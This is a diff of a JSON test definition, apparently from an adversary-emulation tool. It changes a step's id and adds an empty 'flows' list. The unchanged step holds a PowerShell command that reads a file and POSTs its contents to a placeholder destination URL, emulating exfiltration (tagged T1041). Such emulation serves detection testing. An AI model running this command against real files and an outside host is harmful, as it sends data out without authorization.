@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "21d37412-5420-40e4-a2a3-b25803f4fdbc",
+      "id": "22473e14-7fb3-49d7-9180-8d9819fad47b",
       "type": "execute-command",
       "data": {
         "command": "if(-not (Test-Path #{filepath})){ \n  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path #{filepath}\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive",
@@ -16,6 +16,7 @@
       "elevation_required": false
     }
   ],
+  "flows": [],
   "tags": [
     "T1041"
   ],
